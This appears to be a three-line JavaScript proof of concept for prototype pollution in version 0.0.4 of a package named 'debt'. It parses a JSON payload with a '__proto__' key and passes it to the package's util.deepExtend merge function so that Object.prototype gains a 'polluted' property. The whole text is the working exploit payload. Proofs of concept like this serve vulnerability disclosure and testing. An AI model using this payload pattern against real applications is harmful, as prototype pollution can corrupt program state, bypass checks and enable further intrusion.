const util = require('./debt@0.0.4/lib/util')
const payload = JSON.parse('{"__proto__": {"polluted": ["yes"] }}');
util.deepExtend({}, payload);
